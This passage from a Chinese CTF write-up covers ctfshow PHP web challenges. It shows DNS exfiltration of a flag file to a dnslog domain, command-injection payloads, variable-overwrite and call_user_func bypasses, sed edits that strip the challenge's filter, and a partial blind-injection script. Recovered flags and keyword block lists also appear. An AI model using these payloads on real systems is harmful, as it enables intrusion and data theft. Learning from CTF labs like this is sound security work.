<span class="line"><span style="color:#d4d4d4">得到flag：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">ctfshow{64b54b3c-f17b-48c4-a7ee-96a900e16444}</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">#### 3.通过dnslog带出数据</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">注意：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">（1）命令执行时要避免空格，空格会导致空格后面的命令执行不到；</span></span>
<span class="line"><span style="color:#d4d4d4">（2）将读取的文件命令用反引号``包含起来；</span></span>
<span class="line"><span style="color:#d4d4d4">（3）拼接的域名有长度限制。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">为什么可以这么做？</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4"> 如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。（要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现）</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">（1）首先去`dnslog.cn`拿一个域名</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">![image-20221226154420322](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261544391.png)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4">soizc6.dnslog.cn</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">（2）如果有域名解析请求就会被记录。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">利用命令：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4">ping `命令`.域名</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">构造命令：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">#payload：</span></span>
<span class="line"><span style="color:#d4d4d4">?F=`$F` ;ping `cat flag.php|base64`.soizc6.dnslog.cn -c 1    </span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">上述操作之后利用dnslog查看文件内容发现是并没有任何东西的，因为东西过多，而二级域名是有限制的。修改如下：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">?F=`$F` ;ping `cat flag.php | grep ctfshow | tr -cd "[a-z]"/"[0-9]"`.soizc6.dnslog.cn -c 1</span></span>
<span class="line"><span style="color:#d4d4d4"># grep进行匹配，</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">![image-20221226154440954](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261544031.png)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4">flagctfshowc8a020ae298a47aab147add27b0cc2a1.soizc6.dnslog.cn</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">去掉不需要的部分，再根据uuid的格式进行补全即可。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">### web134（变量覆盖）</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#d4d4d4"># @Author: Firebasky</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">highlight_file(__FILE__);</span></span>
<span class="line"><span style="color:#d4d4d4">$key1 = 0;</span></span>
<span class="line"><span style="color:#d4d4d4">$key2 = 0;</span></span>
<span class="line"><span style="color:#d4d4d4">if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {</span></span>
<span class="line"><span style="color:#d4d4d4">    die("nonononono");</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">@parse_str($_SERVER['QUERY_STRING']);</span></span>
<span class="line"><span style="color:#d4d4d4">extract($_POST);</span></span>
<span class="line"><span style="color:#d4d4d4">if($key1 == '36d' &amp;&amp; $key2 == '36d') {</span></span>
<span class="line"><span style="color:#d4d4d4">    die(file_get_contents('flag.php'));</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">这里的parse_str是将字符串解析到变量中，是一个数组的形式，例如：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">![image-20221226162310346](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261623463.png)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">而extract则是从数组中拿到对应变量对应值进行一个创建，</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">![image-20221226162434905](https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261624019.png)</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">很巧合不是么，到这思路就很清晰了。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">由于$_SERVER['QUERY_STRING']会得到我们的查询语句，那我们直接在查询语句中写出对应的数组并赋值，让extract函数进行覆盖。数组键名为key1或key2，数组名则为\_POST：</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">?_POST[key1]=36d&amp;_POST[key2]=36d</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">查看源代码即可拿到flag。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">### web135（外带外带）</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#d4d4d4"># @Author: Firebasky</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">error_reporting(0);</span></span>
<span class="line"><span style="color:#d4d4d4">highlight_file(__FILE__);</span></span>
<span class="line"><span style="color:#d4d4d4">//flag.php</span></span>
<span class="line"><span style="color:#d4d4d4">if($F = @$_GET['F']){</span></span>
<span class="line"><span style="color:#d4d4d4">    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){</span></span>
<span class="line"><span style="color:#d4d4d4">        eval(substr($F,0,6));</span></span>
<span class="line"><span style="color:#d4d4d4">    }else{</span></span>
<span class="line"><span style="color:#d4d4d4">        die("师傅们居然破解了前面的，那就来一个加强版吧");</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">这里依旧要外带数据出来，而且这题我们是可以写文件的，那么可以直接用cp（复制）或者mv（移动）等命令进行一个外带，然后访问即可（当然之前的dnslog那种外带也是可以的，只不过略麻烦）。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">?F=`$F` ;cp flag.php 1.txt</span></span>
<span class="line"><span style="color:#d4d4d4">?F=`$F` ;mv flag.php 1.txt</span></span>
<span class="line"><span style="color:#d4d4d4"># nl 命令和 cat 很像，但是 nl 会带行号</span></span>
<span class="line"><span style="color:#d4d4d4">?F=`$F` ;nl flag.php&gt;1.txt</span></span>
<span class="line"><span style="color:#d4d4d4"># uniq 命令也可以</span></span>
<span class="line"><span style="color:#d4d4d4">?F=`$F` ;uniq flag.php&gt;1.txt    </span></span>
<span class="line"><span style="color:#d4d4d4">```</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">更多命令不再赘述。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">### web136（tee命令）</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4"> Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">```php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#d4d4d4">error_reporting(0);</span></span>
<span class="line"><span style="color:#d4d4d4">function check($x){</span></span>
<span class="line"><span style="color:#d4d4d4">    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){</span></span>
<span class="line"><span style="color:#d4d4d4">        die('too young too simple sometimes naive!');</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">if(isset($_GET['c'])){</span></span>
<span class="line"><span style="color:#d4d4d4">    $c=$_GET['c'];</span></span>
<span class="line"><span style="color:#d4d4d4">    check($c);</span></span>
<span class="line"><span style="color:#d4d4d4">    exec($c);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">else{</span></span>
<span class="line"><span style="color:#d4d4d4">    highlight_file(__FILE__);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?</span></span></code></pre></div></div></figure><p>这里可用 tee 命令进行一个试探。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?c=ls /|tee </span><span style="color:#b5cea8">1</span></span>
<span class="line"><span style="color:#6a9955"># 下到根目录并将其保存为 1 文件</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261709382.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221226170918289"></p><p>得到疑似 flag 文件：f149_15_h3r3</p><p>同理我们得到这个疑似文件：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?c=cat /f149_15_h3r3|tee 2</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212261712838.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221226171219726"></p><p>flag：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{14cf30b9-b627-4b34-8d6d-c8288f88e5c4}</span></span></code></pre></div></div></figure><p>另外还有一个比较骚的就是 —— <strong>直接改题</strong>：</p><p>1. 改 die 为 echo，就算被匹配也不会中断执行</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?c=ls |xargs sed -i 's/die/echo/'</span></span></code></pre></div></div></figure><p>2. 改 exec 为 system，随便执行</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?c=ls |xargs sed -i 's/exec/system/'</span></span></code></pre></div></div></figure><p>这样就可以说是无 waf 了直接。</p><h3 id="web137静态方法调用"><a class="markdownIt-Anchor" href="#web137静态方法调用"></a> web137（静态方法调用）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">ctfshow</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__wakeup</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"private class"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">static</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">getFlag</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">call_user_func</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'ctfshow'</span><span style="color:#d4d4d4">]);</span></span></code></pre></div></div></figure><p>php 调用类的静态方法是不需要实例化的，直接用：：进行调用：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># POST:	</span></span>
<span class="line"><span style="color:#d4d4d4">ctfshow=</span><span style="color:#4ec9b0">ctfshow</span><span style="color:#d4d4d4">::getFlag</span></span></code></pre></div></div></figure><p>如果是非静态方法，写法应该如下：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">call_user_func_array</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">ctfshow</span><span style="color:#d4d4d4">(), </span><span style="color:#ce9178">'getFlag'</span><span style="color:#d4d4d4">), args)</span></span></code></pre></div></div></figure><h3 id="web138除之外的静态类方法调用"><a class="markdownIt-Anchor" href="#web138除之外的静态类方法调用"></a> *web138（除：：之外的静态类方法调用）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">ctfshow</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__wakeup</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"private class"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">static</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">getFlag</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">strripos</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'ctfshow'</span><span style="color:#d4d4d4">], </span><span style="color:#ce9178">":"</span><span style="color:#d4d4d4">)&gt;-</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"private function"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">call_user_func</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'ctfshow'</span><span style="color:#d4d4d4">]);</span></span></code></pre></div></div></figure><p>本题和上题的区别在于冒号被过滤，不能出现冒号。查询官方文档：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212271208895.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221227120812763"></p><p>可以知道，关于类中静态方法的调用是不止一种办法的。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># eg:	</span></span>
<span class="line"><span style="color:#dcdcaa">call_user_func</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__NAMESPACE__</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'\Foo'</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">'test'</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#dcdcaa">call_user_func</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'ctfshow'</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">'getFlag'</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#6a9955"># POST:</span></span>
<span class="line"><span style="color:#d4d4d4">ctfshow[]=ctfshow</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">ctfshow[]=getFlag</span></span>
<span class="line"><span style="color:#6a9955"># 第一个ctfshow是指定类名，第二个指定类中方法名</span></span></code></pre></div></div></figure><h3 id="web139命令盲注"><a class="markdownIt-Anchor" href="#web139命令盲注"></a> ***web139（命令盲注）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">check</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$x</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\\$</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\!</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\@</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\%</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&amp;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\?</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\}</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&gt;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&lt;</span><span style="color:#d16969">|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$x</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'too young too simple sometimes naive!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'c'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'c'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">check</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">exec</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>这一题没有写的权限。只能尝试命令盲注。</p><p>盲注的话，需要截取字符，截取后需要进行相等判断，因此就需要 awk 和 cut 命令进行截取，if 和 sleep 函数进行判断<br>awk 逐行获取<br><img src="https://img-blog.csdnimg.cn/e9b3aa95caa149f380620e0734cc35f3.png" srcset="/img/loading/loading.gif" lazyload alt="img"></p><p>cut 单字符获取</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212281848776.png" srcset="/img/loading/loading.gif" lazyload alt="img"></p><p>sif sleep 控制判断</p><p><img src="https://img-blog.csdnimg.cn/5e03201e39384b89a978267a2eac0b92.png" srcset="/img/loading/loading.gif" lazyload alt="img"></p><p>脚本 —— 盲注爆破文件名：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> requests</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> time</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> string</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4"> = string.ascii_letters + string.digits + </span><span style="color:#ce9178">'_'</span><span style="color:#d4d4d4"> + </span><span style="color:#ce9178">')'</span></span>
<span class="line"><span style="color:#6a9955"># 注意这里的下划线和括号还是必要的，否则文件名不同寻常就会有所缺失</span></span>
<span class="line"><span style="color:#d4d4d4">result = </span><span style="color:#ce9178">""</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> i </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">range</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">15</span><span style="color:#d4d4d4">):</span></span>
<span class="line"><span style="color:#d4d4d4">    key = </span><span style="color:#b5cea8">0</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> j </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">range</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">15</span><span style="color:#d4d4d4">):</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> key == </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">break</span></span>
